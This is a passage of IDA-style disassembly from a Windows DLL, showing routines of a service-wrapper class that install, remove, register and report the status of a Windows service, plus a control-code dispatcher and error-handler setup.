; =============== S U B	R O U T	I N E =======================================


		public Ordinal1025
Ordinal1025	proc near		; CODE XREF: Ordinal563+33p
					; Ordinal1023+6p ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+8], 0
		jz	short loc_6AF487FE
		push	dword ptr [esi+4]
		call	ds:_set_security_error_handler
		and	dword ptr [esi+4], 0
		pop	ecx

loc_6AF487FE:				; CODE XREF: Ordinal1025+7j
		and	dword ptr [esi+8], 0
		pop	esi
		retn
Ordinal1025	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF48804	proc near		; DATA XREF: Ordinal1024+8o
					; Ordinal1026+2Do

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	ecx, dword_6AF68264
		test	ecx, ecx
		jz	short locret_6AF4881B
		push	[esp+arg_4]
		mov	eax, [ecx]
		push	[esp+4+arg_0]
		call	dword ptr [eax+4]

locret_6AF4881B:			; CODE XREF: sub_6AF48804+8j
		retn
sub_6AF48804	endp

; Exported entry 1023.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1023
Ordinal1023	proc near		; CODE XREF: Ordinal558+6j
					; sub_6AF48889+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5D864
		call	Ordinal1025
		and	dword_6AF68264,	0
		retn
Ordinal1023	endp

; Exported entry 1024.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1024
Ordinal1024	proc near		; CODE XREF: Ordinal562+20Cp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1025
		push	offset sub_6AF48804
		call	ds:_set_security_error_handler
		mov	[esi+4], eax
		xor	eax, eax
		inc	eax
		pop	ecx
		mov	[esi+8], eax
		pop	esi
		retn
Ordinal1024	endp

; Exported entry 1026.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1026
Ordinal1026	proc near		; CODE XREF: Ordinal559+29p
					; DATA XREF: .rdata:6AF5D868o ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [ecx+4]
		test	eax, eax
		jz	short loc_6AF48863
		push	[esp+arg_4]
		push	[esp+4+arg_0]
		call	eax
		pop	ecx
		pop	ecx
		jmp	short locret_6AF48886
; ---------------------------------------------------------------------------

loc_6AF48863:				; CODE XREF: Ordinal1026+5j
		push	esi
		mov	esi, ds:_set_security_error_handler
		push	0
		call	esi ; _set_security_error_handler
		push	[esp+8+arg_4]
		push	[esp+0Ch+arg_0]
		call	__security_error_handler
		push	offset sub_6AF48804
		call	esi ; _set_security_error_handler
		add	esp, 10h
		pop	esi

locret_6AF48886:			; CODE XREF: Ordinal1026+13j
		retn	8
Ordinal1026	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF48889(void *, char)
sub_6AF48889	proc near		; DATA XREF: .rdata:off_6AF5D864o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1023
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4889F
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4889F:				; CODE XREF: sub_6AF48889+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF48889	endp

; Exported entry 1031.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1031
Ordinal1031	proc near		; CODE XREF: Ordinal1098+37p
					; DATA XREF: .rdata:off_6AF66098o

var_50		= byte ptr -50h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
hSCObject	= dword	ptr -4
lpServiceName	= dword	ptr  8
lpDisplayName	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
dwStartType	= dword	ptr  14h
lpDependencies	= dword	ptr  18h
lpServiceStartName= dword ptr  1Ch
lpPassword	= dword	ptr  20h
Info		= dword	ptr  24h

		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		add	ecx, 3Ch
		mov	[ebp+var_8], ecx
		call	Ordinal942
		test	eax, eax
		jnz	short loc_6AF488CC
		push	offset aCserviceInstal ; "CService::Install() :	m_OSInfo.IsWinNT("...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	locret_6AF489E9
; ---------------------------------------------------------------------------

loc_6AF488CC:				; CODE XREF: Ordinal1031+13j
		push	ebx
		push	esi
		push	2		; dwDesiredAccess
		xor	ebx, ebx
		push	offset DatabaseName ; "ServicesActive"
		xor	esi, esi
		inc	ebx
		push	esi		; lpMachineName
		mov	[ebp+var_C], ebx
		call	OpenSCManagerA
		cmp	eax, esi
		mov	[ebp+hSCObject], eax
		jnz	short loc_6AF48905
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceInst_0 ; "CService::Install() :	OpenSCManager()	="...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	ebx, ebx
		jmp	loc_6AF489E5
; ---------------------------------------------------------------------------

loc_6AF48905:				; CODE XREF: Ordinal1031+44j
		cmp	[ebp+Info], esi
		push	edi		; Args
		push	10h
		pop	edi
		jz	short loc_6AF48913
		mov	edi, 110h

loc_6AF48913:				; CODE XREF: Ordinal1031+67j
		lea	ecx, [ebp+var_50]
		call	Ordinal1163
		push	esi		; Filename
		lea	ecx, [ebp+var_50]
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF48942
		push	offset aCserviceInst_1 ; "CService::Install() :	path.SplitPath() "...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_50]
		xor	ebx, ebx
		call	Ordinal1164
		jmp	loc_6AF489DB
; ---------------------------------------------------------------------------

loc_6AF48942:				; CODE XREF: Ordinal1031+81j
		push	[ebp+lpPassword] ; lpPassword
		lea	ecx, [ebp+var_50]
		push	[ebp+lpServiceStartName] ; lpServiceStartName
		push	[ebp+lpDependencies] ; lpDependencies
		push	esi		; lpdwTagId
		push	esi		; lpLoadOrderGroup
		call	Ordinal1118
		push	eax		; lpBinaryPathName
		push	ebx		; dwErrorControl
		push	[ebp+dwStartType] ; dwStartType
		push	edi		; dwServiceType
		push	0F01FFh		; dwDesiredAccess
		push	[ebp+lpDisplayName] ; lpDisplayName
		push	[ebp+lpServiceName] ; lpServiceName
		push	[ebp+hSCObject]	; hSCManager
		call	CreateServiceA
		mov	edi, eax
		cmp	edi, esi
		jnz	short loc_6AF48983
		call	ds:GetLastError
		push	eax
		push	offset aCserviceInst_2 ; "CService::Install() :	CreateService()	="...
		jmp	short loc_6AF489B2
; ---------------------------------------------------------------------------

loc_6AF48983:				; CODE XREF: Ordinal1031+CEj
		mov	ecx, [ebp+var_8]
		push	ebx
		call	Ordinal945
		test	eax, eax
		jz	short loc_6AF489C5
		mov	eax, [ebp+arg_8]
		mov	[ebp+Info], eax
		lea	eax, [ebp+Info]
		push	eax		; lpInfo
		push	ebx		; dwInfoLevel
		push	edi		; hService
		call	ChangeServiceConfig2A
		test	eax, eax
		jnz	short loc_6AF489C5
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceInst_3 ; "CService::Install() :	ChangeServiceConf"...

loc_6AF489B2:				; CODE XREF: Ordinal1031+DCj
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		lea	ecx, [ebp+var_50]
		xor	ebx, ebx
		call	Ordinal1164
		jmp	short loc_6AF489D0
; ---------------------------------------------------------------------------

loc_6AF489C5:				; CODE XREF: Ordinal1031+E9j
					; Ordinal1031+FFj
		lea	ecx, [ebp+var_50]
		call	Ordinal1164
		mov	ebx, [ebp+var_C]

loc_6AF489D0:				; CODE XREF: Ordinal1031+11Ej
		cmp	edi, esi
		jz	short loc_6AF489DB
		push	edi		; hSCObject
		call	CloseServiceHandle

loc_6AF489DB:				; CODE XREF: Ordinal1031+98j
					; Ordinal1031+12Dj
		push	[ebp+hSCObject]	; hSCObject
		call	CloseServiceHandle
		pop	edi

loc_6AF489E5:				; CODE XREF: Ordinal1031+5Bj
		pop	esi
		mov	eax, ebx
		pop	ebx

locret_6AF489E9:			; CODE XREF: Ordinal1031+22j
		leave
		retn	20h
Ordinal1031	endp

; Exported entry 1032.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1032(LPCSTR lpServiceName)
		public Ordinal1032
Ordinal1032	proc near		; CODE XREF: Ordinal1098+1Ap
					; Ordinal1099+1Ap
					; DATA XREF: ...

lpServiceName	= dword	ptr  4

		add	ecx, 3Ch
		call	Ordinal942
		test	eax, eax
		jnz	short loc_6AF48A0B
		push	offset aCserviceRemove ; "CService::Remove() : m_OSInfo.IsWinNT()"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	locret_6AF48AAF
; ---------------------------------------------------------------------------

loc_6AF48A0B:				; CODE XREF: Ordinal1032+Aj
		push	ebx
		push	ebp
		push	0F003Fh		; dwDesiredAccess
		push	offset DatabaseName ; "ServicesActive"
		xor	ebp, ebp
		push	0		; lpMachineName
		inc	ebp
		call	OpenSCManagerA
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF48A3F
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceRemo_0 ; "CService::Remove() : OpenSCManager() =="...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	ebp, ebp
		jmp	short loc_6AF48AAB
; ---------------------------------------------------------------------------

loc_6AF48A3F:				; CODE XREF: Ordinal1032+39j
		push	esi
		push	edi
		push	0F01FFh		; dwDesiredAccess
		push	[esp+14h+lpServiceName]	; lpServiceName
		push	ebx		; hSCManager
		call	OpenServiceA
		mov	esi, eax
		test	esi, esi
		jnz	short loc_6AF48A79
		call	ds:GetLastError
		mov	edi, eax
		push	edi		; Args
		push	offset aCserviceRemo_1 ; "CService::Remove() : OpenService() ==	N"...
		call	sub_6AF3102E
		xor	eax, eax
		cmp	edi, 424h
		setz	al
		mov	ebp, eax
		jmp	short loc_6AF48A97
; ---------------------------------------------------------------------------

loc_6AF48A79:				; CODE XREF: Ordinal1032+68j
		push	esi		; hService
		call	DeleteService
		test	eax, eax
		jnz	short loc_6AF48A99
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceRemo_2 ; "CService::Remove() : DeleteService() =="...
		call	sub_6AF3102E
		xor	ebp, ebp

loc_6AF48A97:				; CODE XREF: Ordinal1032+8Aj
		pop	ecx
		pop	ecx

loc_6AF48A99:				; CODE XREF: Ordinal1032+95j
		test	esi, esi
		mov	edi, CloseServiceHandle
		jz	short loc_6AF48AA6
		push	esi		; hSCObject
		call	edi ; CloseServiceHandle

loc_6AF48AA6:				; CODE XREF: Ordinal1032+B4j
		push	ebx		; hSCObject
		call	edi ; CloseServiceHandle
		pop	edi
		pop	esi

loc_6AF48AAB:				; CODE XREF: Ordinal1032+50j
		mov	eax, ebp
		pop	ebp
		pop	ebx

locret_6AF48AAF:			; CODE XREF: Ordinal1032+19j
		retn	4
Ordinal1032	endp

; Exported entry 1037.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1037
Ordinal1037	proc near		; DATA XREF: .rdata:6AF59084o
					; .rdata:6AF5DB24o ...
		mov	eax, [ecx]
		jmp	dword ptr [eax+8]
Ordinal1037	endp

; Exported entry 1039.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1039
Ordinal1039	proc near		; DATA XREF: .rdata:6AF5908Co
					; .rdata:6AF5DB2Co ...
		mov	eax, [ecx]
		call	dword ptr [eax+18h]
		retn	4
Ordinal1039	endp

; Exported entry 1040.
; Exported entry 1041.
; Exported entry 1042.
; Exported entry 1043.
; Exported entry 1044.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1044
Ordinal1044	proc near		; DATA XREF: .rdata:6AF59090o
					; .rdata:6AF59094o ...
		mov	eax, [ecx]	; ccL30_1040
					; ccL30_1041
					; ccL30_1042
					; ccL30_1043
		jmp	dword ptr [eax+18h]
Ordinal1044	endp

; Exported entry 1045.
; Exported entry 1046.
; Exported entry 1047.
; Exported entry 1048.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1046
Ordinal1046	proc near		; DATA XREF: .rdata:6AF590A4o
					; .rdata:6AF590A8o ...
		mov	eax, [ecx]	; ccL30_1045
					; ccL30_1046
					; ccL30_1047
		call	dword ptr [eax+18h]
		retn	8
Ordinal1046	endp

; Exported entry 1049.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1049
Ordinal1049	proc near		; CODE XREF: Ordinal1033+71p
					; Ordinal1038j
					; DATA XREF: ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		jnz	short loc_6AF48AE4
		inc	eax
		jmp	short loc_6AF48B10
; ---------------------------------------------------------------------------

loc_6AF48AE4:				; CODE XREF: Ordinal1049+13j
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+140h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	eax, [esi+18h]
		push	eax		; lpServiceStatus
		push	dword ptr [esi+14h] ; hServiceStatus
		call	SetServiceStatus
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi

loc_6AF48B10:				; CODE XREF: Ordinal1049+16j
		pop	esi
		leave
		retn
Ordinal1049	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF48B13	proc near		; CODE XREF: sub_6AF48C19+AAp
					; DATA XREF: .text:loc_6AF48D4Ao

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		dec	eax
		mov	ecx, dword_6AF68268
		jz	short loc_6AF48B4B
		dec	eax
		jz	short loc_6AF48B44
		dec	eax
		jz	short loc_6AF48B3D
		dec	eax
		jz	short loc_6AF48B36
		dec	eax
		mov	eax, [ecx]
		jz	short loc_6AF48B31
		jmp	dword ptr [eax+1Ch]
; ---------------------------------------------------------------------------

loc_6AF48B31:				; CODE XREF: sub_6AF48B13+19j
		call	dword ptr [eax+14h]
		jmp	short locret_6AF48B50
; ---------------------------------------------------------------------------

loc_6AF48B36:				; CODE XREF: sub_6AF48B13+14j
		mov	eax, [ecx]
		call	dword ptr [eax+18h]
		jmp	short locret_6AF48B50
; ---------------------------------------------------------------------------

loc_6AF48B3D:				; CODE XREF: sub_6AF48B13+11j
		mov	eax, [ecx]
		call	dword ptr [eax+10h]
		jmp	short locret_6AF48B50
; ---------------------------------------------------------------------------

loc_6AF48B44:				; CODE XREF: sub_6AF48B13+Ej
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		jmp	short locret_6AF48B50
; ---------------------------------------------------------------------------

loc_6AF48B4B:				; CODE XREF: sub_6AF48B13+Bj
		mov	eax, [ecx]
		call	dword ptr [eax+8]

locret_6AF48B50:			; CODE XREF: sub_6AF48B13+21j
					; sub_6AF48B13+28j ...
		retn	4
sub_6AF48B13	endp

; Exported entry 1033.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1033
Ordinal1033	proc near		; CODE XREF: Ordinal1034+Dp
					; Ordinal1035+Dp ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+140h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, [ebp+arg_8]
		mov	eax, [ebp+arg_0]
		cmp	eax, 1
		mov	[esi+2Ch], ecx
		mov	ecx, [ebp+arg_4]
		mov	[esi+30h], ecx
		mov	ecx, [ebp+arg_C]
		mov	[esi+24h], ecx
		mov	ecx, [ebp+arg_10]
		mov	[esi+1Ch], eax
		mov	[esi+28h], ecx
		mov	[esi+20h], edi
		jz	short loc_6AF48B9D
		mov	[esi+24h], edi
		mov	[esi+28h], edi

loc_6AF48B9D:				; CODE XREF: Ordinal1033+42j
		cmp	eax, 2
		jb	short loc_6AF48BB6
		cmp	eax, 3
		jbe	short loc_6AF48BB1
		cmp	eax, 4
		jbe	short loc_6AF48BB6
		cmp	eax, 6
		ja	short loc_6AF48BB6

loc_6AF48BB1:				; CODE XREF: Ordinal1033+52j
		mov	[esi+20h], edi
		jmp	short loc_6AF48BC2
; ---------------------------------------------------------------------------

loc_6AF48BB6:				; CODE XREF: Ordinal1033+4Dj
					; Ordinal1033+57j ...
		mov	eax, [esi+34h]
		mov	[esi+30h], edi
		mov	[esi+2Ch], edi
		mov	[esi+20h], eax

loc_6AF48BC2:				; CODE XREF: Ordinal1033+61j
		mov	ecx, esi
		call	Ordinal1049
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		leave
		retn	14h
Ordinal1033	endp

; Exported entry 1034.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1034
Ordinal1034	proc near		; CODE XREF: Ordinal1100+3p
					; DATA XREF: .rdata:6AF5DB18o ...
		push	0
		push	0
		push	1
		push	7530h
		push	3
		call	Ordinal1033
		retn
Ordinal1034	endp

; Exported entry 1035.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1035
Ordinal1035	proc near		; DATA XREF: .rdata:6AF5907Co
					; .rdata:6AF5DB1Co ...
		push	0
		push	0
		push	1
		push	7530h
		push	6
		call	Ordinal1033
		retn
Ordinal1035	endp

; Exported entry 1036.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1036
Ordinal1036	proc near		; DATA XREF: .rdata:6AF59080o
					; .rdata:6AF5DB20o ...
		push	0
		push	0
		push	1
		push	7530h
		push	5
		call	Ordinal1033
		retn
Ordinal1036	endp

; Exported entry 1038.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1038
Ordinal1038	proc near		; DATA XREF: .rdata:6AF59088o
					; .rdata:6AF5DB28o ...
		jmp	Ordinal1049
Ordinal1038	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF48C19	proc near		; DATA XREF: .text:6AF48D3Co

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ecx-6]	; switch 9 cases
		cmp	eax, 8
		ja	loc_6AF48CC2	; jumptable 6AF48C2B default case
		jmp	ds:off_6AF48CCC[eax*4] ; switch	jump

loc_6AF48C32:				; DATA XREF: .text:off_6AF48CCCo
		mov	ecx, dword_6AF68268 ; jumptable	6AF48C2B case 6
		mov	eax, [ecx]
		call	dword ptr [eax+20h]
		jmp	loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C42:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		mov	ecx, dword_6AF68268 ; jumptable	6AF48C2B case 7
		mov	eax, [ecx]
		call	dword ptr [eax+24h]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C4F:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		mov	ecx, dword_6AF68268 ; jumptable	6AF48C2B case 8
		mov	eax, [ecx]
		call	dword ptr [eax+28h]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C5C:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		mov	ecx, dword_6AF68268 ; jumptable	6AF48C2B case 9
		mov	eax, [ecx]
		call	dword ptr [eax+2Ch]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C69:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		mov	ecx, dword_6AF68268 ; jumptable	6AF48C2B case 10
		mov	eax, [ecx]
		call	dword ptr [eax+30h]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C76:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		push	[ebp+arg_8]	; jumptable 6AF48C2B case 11
		mov	ecx, dword_6AF68268
		push	[ebp+arg_4]
		mov	eax, [ecx]
		call	dword ptr [eax+34h]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C89:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		push	[ebp+arg_8]	; jumptable 6AF48C2B case 12
		mov	ecx, dword_6AF68268
		push	[ebp+arg_4]
		mov	eax, [ecx]
		call	dword ptr [eax+38h]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48C9C:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		push	[ebp+arg_8]	; jumptable 6AF48C2B case 13
		mov	ecx, dword_6AF68268
		push	[ebp+arg_4]
		mov	eax, [ecx]
		call	dword ptr [eax+3Ch]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48CAF:				; CODE XREF: sub_6AF48C19+12j
					; DATA XREF: .text:off_6AF48CCCo
		push	[ebp+arg_8]	; jumptable 6AF48C2B case 14
		mov	ecx, dword_6AF68268
		push	[ebp+arg_4]
		mov	eax, [ecx]
		call	dword ptr [eax+40h]
		jmp	short loc_6AF48CC8
; ---------------------------------------------------------------------------

loc_6AF48CC2:				; CODE XREF: sub_6AF48C19+Cj
		push	ecx		; jumptable 6AF48C2B default case
		call	sub_6AF48B13

loc_6AF48CC8:				; CODE XREF: sub_6AF48C19+24j
					; sub_6AF48C19+34j ...
		pop	ebp
		retn	10h
sub_6AF48C19	endp

; ---------------------------------------------------------------------------
off_6AF48CCC	dd offset loc_6AF48C32	; DATA XREF: sub_6AF48C19+12r
		dd offset loc_6AF48C42	; jump table for switch	statement
		dd offset loc_6AF48C4F
		dd offset loc_6AF48C5C
		dd offset loc_6AF48C69
		dd offset loc_6AF48C76
		dd offset loc_6AF48C89
		dd offset loc_6AF48C9C
		dd offset loc_6AF48CAF
; ---------------------------------------------------------------------------

loc_6AF48CF0:				; DATA XREF: Ordinal1030+11Eo
		call	ds:GetCurrentThread
		mov	ecx, dword_6AF68268
		push	eax
		add	ecx, 160h
		call	Ordinal842
		test	eax, eax
		jnz	short loc_6AF48D1C
		push	offset aCserviceServic ; "CService::ServiceMain() : m_pService->m"...
		call	sub_6AF3102E
		pop	ecx
		jmp	locret_6AF48DB8
; ---------------------------------------------------------------------------

loc_6AF48D1C:				; CODE XREF: .text:6AF48D0Aj
		mov	ecx, dword_6AF68268
		push	esi
		push	1
		add	ecx, 3Ch
		call	Ordinal945
		xor	esi, esi
		test	eax, eax
		mov	eax, dword_6AF68268
		mov	eax, [eax+38h]
		jz	short loc_6AF48D4A
		push	esi
		push	offset sub_6AF48C19
		push	eax
		call	RegisterServiceCtrlHandlerExA
		jmp	short loc_6AF48D56
; ---------------------------------------------------------------------------

loc_6AF48D4A:				; CODE XREF: .text:6AF48D39j
		push	offset sub_6AF48B13
		push	eax
		call	RegisterServiceCtrlHandlerA

loc_6AF48D56:				; CODE XREF: .text:6AF48D48j
		mov	ecx, dword_6AF68268
		mov	[ecx+14h], eax
		mov	ecx, dword_6AF68268
		cmp	[ecx+14h], esi
		jnz	short loc_6AF48D7F
		call	ds:GetLastError
		push	eax
		push	offset aCserviceServ_0 ; "CService::ServiceMain() : m_pService->m"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF48DB7
; ---------------------------------------------------------------------------

loc_6AF48D7F:				; CODE XREF: .text:6AF48D68j
		push	esi
		push	esi
		push	1
		push	7530h
		push	2
		call	Ordinal1033
		mov	ecx, dword_6AF68268
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		cmp	eax, esi
		mov	ecx, dword_6AF68268
		jz	short loc_6AF48DAC
		push	eax
		push	42Ah
		jmp	short loc_6AF48DAE
; ---------------------------------------------------------------------------

loc_6AF48DAC:				; CODE XREF: .text:6AF48DA2j
		push	esi
		push	esi

loc_6AF48DAE:				; CODE XREF: .text:6AF48DAAj
		push	esi
		push	esi
		push	1
		call	Ordinal1033

loc_6AF48DB7:				; CODE XREF: .text:6AF48D7Dj
		pop	esi

locret_6AF48DB8:			; CODE XREF: .text:6AF48D17j
		retn	8
; Exported entry 1029.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1029
Ordinal1029	proc near		; CODE XREF: sub_6AF48E61+3p
					; Ordinal1073+43j
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5DB10
		and	dword_6AF68268,	0
		lea	ecx, [esi+160h]
		call	Ordinal836
		lea	ecx, [esi+140h]
		call	Ordinal1279
		lea	ecx, [esi+3Ch]
		call	Ordinal933
		lea	ecx, [esi+38h]
		pop	esi
		jmp	sub_6AF3789B
Ordinal1029	endp

; Exported entry 1028.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1028
Ordinal1028	proc near		; CODE XREF: Ordinal1072+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	edi
		xor	edi, edi
		lea	ecx, [esi+38h]
		mov	dword ptr [esi], offset	off_6AF5DB10
		mov	[esi+14h], edi
		mov	[esi+34h], edi
		call	sub_6AF318C3
		lea	ecx, [esi+3Ch]
		call	Ordinal932
		lea	ecx, [esi+140h]
		call	Ordinal1278
		lea	ecx, [esi+160h]
		call	Ordinal833
		push	10h		; Size
		lea	eax, [esi+4]
		push	edi		; Val
		push	eax		; Dst
		mov	dword_6AF68268,	esi
		call	memset
		add	esp, 0Ch
		mov	[esi+2Ch], edi
		mov	[esi+30h], edi
		mov	[esi+24h], edi
		mov	[esi+28h], edi
		mov	[esi+20h], edi
		pop	edi
		mov	dword ptr [esi+18h], 10h
		mov	dword ptr [esi+1Ch], 1
		mov	eax, esi
		pop	esi
		retn
Ordinal1028	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF48E61(void *, char)
sub_6AF48E61	proc near		; DATA XREF: .rdata:off_6AF5DB10o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1029
		test	[esp+4+arg_0], 1
		jz	short loc_6AF48E77
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF48E77:				; CODE XREF: sub_6AF48E61+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF48E61	endp

; Exported entry 1030.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1030(char *Src, int)
		public Ordinal1030
Ordinal1030	proc near		; CODE XREF: Ordinal1095+39p
					; DATA XREF: .rdata:off_6AF66098o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_101	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [esi+3Ch]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		call	Ordinal942
		test	eax, eax
		jnz	short loc_6AF48EBB
		push	offset aCserviceRegist ; "CService::Register() : m_OSInfo.IsWinNT"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF4900F
; ---------------------------------------------------------------------------

loc_6AF48EBB:				; CODE XREF: Ordinal1030+2Aj
		push	offset aCserviceRegi_0 ; "CService::Register()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		and	[ebp+var_4], 0
		push	[ebp+Src]	; Src
		lea	ecx, [esi+38h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31B1D
		jmp	loc_6AF48F7B
; ---------------------------------------------------------------------------

loc_6AF48EE0:				; DATA XREF: .rdata:6AF63B18o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF48F78
		retn
; ---------------------------------------------------------------------------

loc_6AF48F23:				; DATA XREF: .rdata:6AF63B28o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF48F78
		retn
; ---------------------------------------------------------------------------

loc_6AF48F78:				; DATA XREF: Ordinal1030+A0o
					; Ordinal1030+F5o
		mov	esi, [ebp+var_28]

